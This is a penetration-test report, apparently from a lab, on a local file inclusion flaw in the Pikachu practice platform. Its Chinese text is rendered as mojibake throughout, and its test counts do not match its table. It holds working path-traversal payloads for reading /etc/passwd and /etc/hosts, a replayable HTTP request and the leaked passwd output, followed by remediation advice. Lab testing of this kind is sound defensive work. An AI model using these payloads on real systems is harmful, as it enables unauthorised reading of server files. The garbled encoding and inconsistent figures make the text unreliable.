# æ¸—é€æµ‹è¯•æŠ¥å‘Š: æ–‡ä»¶åŒ…å«æ¼æ´æ£€æµ‹

## ç›®æ ‡ä¿¡æ¯

- **URL**: http://192.168.3.24:8081/vul/fileinclude/fi_local.php
- **æµ‹è¯•æ—¶é—´**: 2026-02-02
- **æ¼æ´ç±»å‹**: æœ¬åœ°æ–‡ä»¶åŒ…å« (Local File Inclusion, LFI)
- **æµ‹è¯•ç±»å‹**: åªè¯»æµ‹è¯•

## å‘ç°çš„é—®é¢˜

### ğŸ”´ é«˜å± (1)

**[æ–‡ä»¶æ“ä½œ] ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´**

- **æ¥å£**: GET /vul/fileinclude/fi_local.php
- **å‚æ•°**: filename
- **æè¿°**: filename å‚æ•°æœªè¿›è¡Œè·¯å¾„è¿‡æ»¤ï¼Œå¯é€šè¿‡è·¯å¾„éå†è¯»å–æœåŠ¡å™¨ä»»æ„æ–‡ä»¶
- **å½±å“**: å¯è¯»å–ç³»ç»Ÿæ•æ„Ÿæ–‡ä»¶ï¼ˆ/etc/passwdã€/etc/hostsç­‰ï¼‰ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ã€è¿›ä¸€æ­¥æ¸—é€
- **æµ‹è¯•ç±»å‹**: åªè¯»æµ‹è¯•

**å¤ç°æ­¥éª¤**:

1. æ­£å¸¸è¯·æ±‚: `filename=file2.php`
2. æ¶æ„è¯·æ±‚: `filename=../../../../../../../etc/passwd`
3. æˆåŠŸè¿”å›ç³»ç»Ÿæ•æ„Ÿæ–‡ä»¶å†…å®¹

**æœ‰æ•ˆPayloads**:

- `../../../../../../../etc/passwd` - åŸºç¡€è·¯å¾„éå†
- `%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd` - URLç¼–ç ç»•è¿‡

**æ¼æ´ç¡®å®šå­˜åœ¨ï¼Œå¯ç›´æ¥åœ¨ Yakit ä¸­å‘åŒ…æ¥æŸ¥çœ‹æ­¤æ¼æ´ï¼å½“å‰æ¼æ´æ•°æ®åŒ…ä¸ºï¼š**

```http
GET /vul/fileinclude/fi_local.php?filename=../../../../../../../etc/passwd&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 HTTP/1.1
Host: 192.168.3.24:8081
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: keep-alive
```

**å“åº”å†…å®¹ï¼ˆéƒ¨åˆ†ï¼‰**:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:1000:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
mysql:x:999:999::/home/mysql:/bin/sh
```

## æµ‹è¯•è¯¦æƒ…

### æµ‹è¯•ç”¨ä¾‹ä¸ç»“æœ

| æµ‹è¯•é¡¹         | Payload                           | ç»“æœ    |
| -------------- | --------------------------------- | ------- |
| åŸºç¡€è·¯å¾„éå†   | `../../../../../../../etc/passwd` | âœ… æˆåŠŸ |
| URLç¼–ç ç»•è¿‡    | `%2e%2e%2f%2e%2e%2fetc%2fpasswd`  | âœ… æˆåŠŸ |
| åŒå†™ç»•è¿‡       | `....//....//etc/passwd`          | âŒ å¤±è´¥ |
| ç©ºå­—èŠ‚æˆªæ–­     | `/etc/passwd%00`                  | âŒ å¤±è´¥ |
| ç»å¯¹è·¯å¾„       | `/etc/passwd`                     | âŒ å¤±è´¥ |
| è¯»å–/etc/hosts | `../../../../../../../etc/hosts`  | âœ… æˆåŠŸ |

### è¯»å–åˆ°çš„æ•æ„Ÿæ–‡ä»¶

1. **/etc/passwd** - ç³»ç»Ÿç”¨æˆ·åˆ—è¡¨
2. **/etc/hosts** - ä¸»æœºé…ç½®

### ç³»ç»Ÿä¿¡æ¯

- **OSç±»å‹**: Linux
- **Webåº”ç”¨**: Pikachu æ¼æ´ç»ƒä¹ å¹³å°
- **ä¸­é—´ä»¶**: PHP

## ä¿®å¤å»ºè®®

1. **ä¸¥æ ¼è¿‡æ»¤è·¯å¾„éå†å­—ç¬¦**: è¿‡æ»¤ `../`ã€`..\`ã€`..` ç­‰è·¯å¾„éå†å­—ç¬¦
2. **ä½¿ç”¨ç™½åå•**: é™å®šå¯è®¿é—®çš„æ–‡ä»¶åˆ—è¡¨ï¼Œåªå…è®¸è®¿é—®æŒ‡å®šç›®å½•ä¸‹çš„æ–‡ä»¶
3. **ä½¿ç”¨IDç´¢å¼•**: ä¸ä½¿ç”¨æ–‡ä»¶åç›´æ¥è®¿é—®ï¼Œæ”¹ç”¨IDæ˜ å°„åˆ°å…·ä½“æ–‡ä»¶
4. **æ–‡ä»¶è·¯å¾„è§„èŒƒåŒ–**: ä½¿ç”¨ `realpath()` ç­‰å‡½æ•°è·å–è§„èŒƒåŒ–è·¯å¾„ï¼Œç¡®ä¿åœ¨å…è®¸ç›®å½•å†…
5. **ç¦ç”¨å±é™©å‡½æ•°**: å¦‚éå¿…è¦ï¼Œç¦ç”¨ `include()`ã€`require()` ç­‰æ–‡ä»¶åŒ…å«å‡½æ•°

## ç»Ÿè®¡

- **æ€»æµ‹è¯•ç”¨ä¾‹**: 9
- **å‘ç°é—®é¢˜**: 1 (é«˜å±)
- **æˆåŠŸPayload**: 3
- **å¤±è´¥Payload**: 3

---

_æŠ¥å‘Šç”Ÿæˆæ—¶é—´: 2026-02-02_
